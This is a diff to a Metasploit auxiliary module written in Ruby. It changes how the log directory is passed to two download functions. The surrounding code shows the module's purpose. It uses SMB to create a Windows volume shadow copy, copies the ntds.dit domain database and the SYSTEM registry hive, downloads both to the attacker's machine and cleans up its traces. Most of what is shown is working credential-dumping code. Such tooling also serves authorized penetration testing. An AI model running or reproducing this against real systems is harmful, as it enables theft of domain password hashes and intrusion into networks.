@@ -47,7 +47,6 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		deregister_options('RHOST')
-		@logdir = "#{datastore['LOGDIR']}/#{Time.now.strftime("%Y-%m-%d-%H%M%S")}"
 	end
 	
 	
@@ -60,6 +59,7 @@ class Metasploit3 < Msf::Auxiliary
 		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
+    logdir = datastore['LOGDIR']
 		
 		#Try and Connect to the target
 		begin
@@ -84,8 +84,8 @@ class Metasploit3 < Msf::Auxiliary
 			vscpath = make_volume_shadow_copy(smbshare, ip, cmd, createvsc, text, bat)
 			copy_ntds(smbshare, ip, cmd, vscpath)
 			copy_sys_hive(smbshare, ip, cmd)
-			download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip)
-			download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip)
+			download_ntds(smbshare, "\\WINDOWS\\Temp\\ntds", ip, logdir)
+			download_sys_hive(smbshare, "\\WINDOWS\\Temp\\sys", ip, logdir)
 			cleanup_after(smbshare, ip, cmd)
 			disconnect()
 		rescue 
@@ -184,17 +184,17 @@ class Metasploit3 < Msf::Auxiliary
 	#-------------------------------------------------------------------
 	# Download the ntds.dit copy to your attacking machine
 	#-------------------------------------------------------------------
-	def download_ntds(smbshare, file, ip)
+	def download_ntds(smbshare, file, ip, logdir)
 		print_status("Downloading ntds.dit file")
 		begin 
 			# Try to download ntds.dit
-			newdir = "#{@logdir}/#{ip}"
+			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			remotefile = simple.open("#{file}", 'rob')		
 			data = remotefile.read
 			#Save it to local file system
-			file = File.open("#{@logdir}/#{ip}/ntds", "w+")
+			file = File.open("#{logdir}/#{ip}/ntds", "w+")
 			file.write(data)
 			file.close
 			remotefile.close
@@ -210,17 +210,17 @@ class Metasploit3 < Msf::Auxiliary
 	#----------------------------------------------------------------------
 	# Download the SYSTEM hive copy to your attacking machine
 	#----------------------------------------------------------------------
-	def download_sys_hive(smbshare, file, ip)
+	def download_sys_hive(smbshare, file, ip, logdir)
 		print_status("Downloading SYSTEM hive file")
 		begin
 			# Try to download SYSTEM hive
-			newdir = "#{@logdir}/#{ip}"
+			newdir = "#{logdir}/#{ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
 			remotefile = simple.open("#{file}", 'rob')		
 			data = remotefile.read
 			#Save it to local file system
-			file = File.open("#{@logdir}/#{ip}/sys", "w+")
+			file = File.open("#{logdir}/#{ip}/sys", "w+")
 			file.write(data)
 
 			file.close
